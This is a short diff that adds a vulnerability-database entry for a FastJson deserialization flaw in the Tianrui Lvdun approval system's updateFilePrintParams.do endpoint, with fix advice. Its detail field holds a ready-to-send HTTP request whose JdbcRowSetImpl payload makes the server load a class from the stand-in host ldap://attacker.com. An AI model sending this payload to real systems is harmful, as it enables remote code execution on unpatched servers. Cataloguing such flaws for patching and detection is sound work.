@@ -1,0 +1,13 @@
+vendor = "天锐绿盾"
+name = "天锐绿盾审批系统 updateFilePrintParams.do FastJson反序列化漏洞"
+type = "反序列化"
+path = "/updateFilePrintParams.do"
+version = "3.53.240913"
+detail = """POST /updateFilePrintParams.do HTTP/1.1 Host: target Content-Type: application/json
+
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/EvilClass","autoCommit":true}"""
+fix = "升级 FastJson；启用 safeMode"
+date = 20260401
+label = "nday"
+cve = "TVD-2026-07625"
+verifier = "AdySec"
